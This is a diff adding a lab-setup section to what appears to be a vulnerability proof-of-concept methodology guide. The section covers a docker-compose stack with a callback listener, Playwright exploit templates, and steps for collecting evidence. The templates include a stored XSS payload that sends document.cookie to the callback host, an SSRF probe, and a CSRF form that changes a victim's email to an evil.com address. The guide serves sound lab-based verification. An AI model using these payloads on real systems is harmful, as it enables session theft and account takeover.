@@ -107,6 +107,251 @@ curl -X POST 'https://target.com/vulnerable-endpoint' \
 # Impact: [what attacker gains]
 ```
 
+### Reproduction Environment Setup
+
+#### Docker-Compose Lab Architecture
+
+The best methodology for PoC reproduction is a docker-compose stack that mirrors real exploit conditions:
+
+**Step 1 — Check for existing containerization:**
+Before creating a new setup, check if the target app already has:
+- `Dockerfile` or `docker-compose.yml` in the repository root
+- Container definitions in CI/CD configs (`.github/workflows/`, `Jenkinsfile`, etc.)
+- README instructions for Docker-based development
+
+If present, extend the existing compose file rather than creating from scratch.
+
+**Step 2 — Build the compose stack:**
+
+```yaml
+# docker-compose.poc.yml
+version: "3.9"
+
+services:
+  # A. Target Application
+  target:
+    build:
+      context: .
+      dockerfile: Dockerfile        # Use existing Dockerfile if available
+    ports:
+      - "8080:8080"                  # Expose for Playwright interaction
+    networks:
+      - internal
+      - external
+    environment:
+      - DEBUG=true                   # Enable verbose logging for evidence
+
+  # B. Attacker Callback / OOB Listener (for SSRF, OOB-XXE, DNS rebinding, blind injection)
+  callback:
+    image: python:3-slim
+    command: >
+      python -c "
+      from http.server import HTTPServer, SimpleHTTPRequestHandler
+      import logging
+      logging.basicConfig(level=logging.INFO)
+      class H(SimpleHTTPRequestHandler):
+          def do_GET(self):
+              logging.info(f'CALLBACK: {self.path} from {self.client_address}')
+              self.send_response(200)
+              self.end_headers()
+              self.wfile.write(b'callback-received')
+          do_POST = do_GET
+      HTTPServer(('0.0.0.0', 9999), H).serve_forever()
+      "
+    ports:
+      - "9999:9999"                  # Expose for external monitoring
+    networks:
+      - internal                     # Shares network with target — critical for SSRF/OOB
+      - external
+
+  # C. DNS rebinding server (optional — only for DNS rebinding / SSRF bypass tests)
+  # dns-rebind:
+  #   image: nccgroup/singularity
+  #   networks:
+  #     - internal
+
+  # D. Internal service (optional — simulates internal infra for SSRF pivoting)
+  # internal-service:
+  #   image: redis:7-alpine
+  #   networks:
+  #     - internal                   # NOT exposed externally
+
+networks:
+  internal:
+    driver: bridge
+    internal: true                   # No internet — simulates private network
+  external:
+    driver: bridge
+```
+
+**When to include the callback container:**
+- SSRF testing (target reaches `http://callback:9999/ssrf-proof`)
+- Out-of-band XXE/SSRF exfiltration
+- Blind injection confirmation (SQLi, SSTI, command injection)
+- DNS rebinding PoCs
+- Any vulnerability requiring out-of-band confirmation
+
+**When NOT needed (target container alone suffices):**
+- Reflected/stored XSS (client-side — use Playwright directly)
+- IDOR/broken access control
+- Logic bugs
+- Authentication bypass
+- Direct response-based injection (in-band SQLi, direct RCE output)
+
+#### Playwright Full-Interaction PoC
+
+**Almost mandatory for client-side vulnerabilities.** Playwright provides:
+- Full browser interaction with video recording — indisputable proof
+- JavaScript execution context — necessary for DOM XSS, CSRF, clickjacking PoCs
+- Network interception — capture exact requests/responses
+- Multi-page flows — login → navigate → trigger → exfiltrate chains
+
+**Playwright PoC template:**
+
+```typescript
+// poc.spec.ts — Playwright PoC with video recording
+import { test, expect } from '@playwright/test';
+
+test.describe('Vulnerability PoC', () => {
+  test.use({
+    video: 'on',                    // ALWAYS record video for evidence
+    screenshot: 'on',               // Capture screenshots at key moments
+    trace: 'on',                    // Full trace for timeline analysis
+  });
+
+  test('XSS-001: Stored XSS in comment field', async ({ page }) => {
+    // Step 1: Authenticate (if needed)
+    await page.goto('http://localhost:8080/login');
+    await page.fill('#username', 'attacker');
+    await page.fill('#password', 'password');
+    await page.click('#login-btn');
+
+    // Step 2: Inject payload
+    const payload = '<img src=x onerror="fetch(\'http://callback:9999/xss-proof?cookie=\'+document.cookie)">';
+    await page.goto('http://localhost:8080/comments');
+    await page.fill('#comment-input', payload);
+    await page.click('#submit');
+
+    // Step 3: Trigger as victim (new context = different user)
+    const victimContext = await page.context().browser()!.newContext();
+    const victimPage = await victimContext.newPage();
+    await victimPage.goto('http://localhost:8080/login');
+    await victimPage.fill('#username', 'victim');
+    await victimPage.fill('#password', 'password');
+    await victimPage.click('#login-btn');
+
+    // Step 4: Victim views the page with stored XSS
+    await victimPage.goto('http://localhost:8080/comments');
+
+    // Step 5: Verify callback received (check callback container logs)
+    // docker logs poc-callback-1 | grep "xss-proof"
+
+    await victimContext.close();
+  });
+
+  test('SSRF-001: Server-side request to internal network', async ({ page }) => {
+    await page.goto('http://localhost:8080/fetch-url');
+
+    // Inject internal URL pointing to callback container
+    await page.fill('#url-input', 'http://callback:9999/ssrf-proof');
+    await page.click('#fetch-btn');
+
+    // The callback container logs will show the request came from the target container
+    // Proving the server followed the URL to the internal network
+  });
+
+  test('CSRF-001: State-changing action without token', async ({ page, context }) => {
+    // Step 1: Victim is logged in
+    await page.goto('http://localhost:8080/login');
+    await page.fill('#username', 'victim');
+    await page.fill('#password', 'password');
+    await page.click('#login-btn');
+
+    // Step 2: Attacker page triggers cross-origin request
+    await page.setContent(`
+      <html><body>
+        <h1>Attacker Page</h1>
+        <form id="csrf" action="http://localhost:8080/api/change-email" method="POST">
+          <input name="email" value="attacker@evil.com">
+        </form>
+        <script>document.getElementById('csrf').submit();</script>
+      </body></html>
+    `);
+
+    // Step 3: Verify email was changed
+    await page.goto('http://localhost:8080/profile');
+    await expect(page.locator('#email')).toContainText('attacker@evil.com');
+  });
+});
+```
+
+**Playwright config for PoC recording:**
+
+```typescript
+// playwright.config.ts
+import { defineConfig } from '@playwright/test';
+
+export default defineConfig({
+  use: {
+    baseURL: 'http://localhost:8080',
+    video: 'on',                     // Always record
+    screenshot: 'only-on-failure',
+    trace: 'on',
+  },
+  outputDir: './poc-evidence/',       // All artifacts in evidence directory
+  reporter: [['html', { outputFolder: './poc-report/' }]],
+});
+```
+
+**When to use Playwright (almost mandatory):**
+- DOM XSS — need browser JS execution context to prove DOM manipulation
+- Stored XSS — need multi-user flow (attacker stores, victim triggers)
+- CSRF — need cross-origin request with victim's session
+- Clickjacking — need iframe interaction
+- Open redirect chains — need to follow redirects in browser context
+- OAuth flow attacks — multi-step browser interactions
+- Client-side prototype pollution — need browser object manipulation
+- Any multi-step exploit chain involving user interaction
+
+**When curl/scripts suffice (Playwright optional but nice):**
+- Server-side injection (SQLi, RCE, SSTI) — curl proves it
+- SSRF — curl or python script with exact request
+- XXE — curl with XML payload
+- Deserialization — python/java script generating serialized payload
+- API-level auth bypass — curl with modified headers/tokens
+
+#### Evidence Collection Protocol
+
+After reproduction, collect:
+1. **Video recording** — from Playwright (`poc-evidence/*.webm`)
+2. **Network trace** — Playwright trace file or HAR export
+3. **Callback container logs** — `docker compose logs callback` for OOB proof
+4. **Target container logs** — `docker compose logs target` for server-side evidence
+5. **Screenshots** — key moments (injection, trigger, impact)
+6. **Exact commands** — reproducible curl/script for server-side vulns
+
+#### Running the PoC
+
+```bash
+# 1. Start the lab environment
+docker compose -f docker-compose.poc.yml up -d
+
+# 2. Wait for target to be ready
+until curl -s http://localhost:8080/health > /dev/null 2>&1; do sleep 1; done
+
+# 3. Run Playwright PoC (client-side vulns)
+npx playwright test poc.spec.ts
+
+# 4. Or run curl-based PoC (server-side vulns)
+./poc-ssrf.sh
+
+# 5. Collect evidence
+docker compose -f docker-compose.poc.yml logs > poc-evidence/container-logs.txt
+
+# 6. Teardown
+docker compose -f docker-compose.poc.yml down -v
+```
+
 ---
 
 ## Proof Collection
